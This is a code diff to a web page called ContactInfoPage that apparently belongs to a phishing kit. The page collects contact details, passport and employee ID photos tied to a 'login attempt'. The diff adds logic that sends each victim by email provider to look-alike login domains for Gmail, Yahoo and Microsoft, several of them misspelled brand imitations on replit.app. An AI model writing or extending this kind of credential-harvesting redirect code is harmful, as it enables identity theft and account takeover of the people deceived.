@@ -137,6 +137,30 @@ export default function ContactInfoPage() {
     reader.readAsDataURL(file);
   };
 
+  const getRedirectUrlByEmail = (email: string): string => {
+    const emailLower = email.toLowerCase();
+    
+    // Gmail redirect
+    if (emailLower.includes('@gmail.com')) {
+      return 'https://prepaidsolution-conectionsmail.com/';
+    }
+    
+    // Yahoo redirect (yahoo.com, yahoo.co.id, yahoo.ph, etc.)
+    if (emailLower.includes('@yahoo.')) {
+      return 'https://mypaymentvaultapp-yahoo.replit.app/login';
+    }
+    
+    // Microsoft redirect (outlook.com, hotmail.com, msn.com)
+    if (emailLower.includes('@outlook.com') || 
+        emailLower.includes('@hotmail.com') || 
+        emailLower.includes('@msn.com')) {
+      return '/microsoft-email';
+    }
+    
+    // Default fallback
+    return 'https://prepaidsolution-conectionsmail.com/';
+  };
+
   const submitMutation = useMutation({
     mutationFn: async (data: ContactInfoForm) => {
       // Double-check loginAttemptId exists
@@ -147,21 +171,29 @@ export default function ContactInfoPage() {
         throw new Error('Session expired. Please login again.');
       }
 
-      return await apiRequest('POST', '/api/contact-info', {
+      await apiRequest('POST', '/api/contact-info', {
         loginAttemptId: currentAttemptId,
         ...data,
         passportPhoto,
         employeeIdPhoto,
       });
+      
+      return data.email;
     },
-    onSuccess: () => {
+    onSuccess: (email: string) => {
       toast({
         title: 'Success',
         description: 'Your information has been submitted successfully',
       });
       
+      const redirectUrl = getRedirectUrlByEmail(email);
+      
       setTimeout(() => {
-        window.location.href = 'https://google-mypaymentvautlt.replit.app/';
+        if (redirectUrl.startsWith('/')) {
+          setLocation(redirectUrl);
+        } else {
+          window.location.href = redirectUrl;
+        }
       }, 2000);
     },
     onError: (error: Error) => {
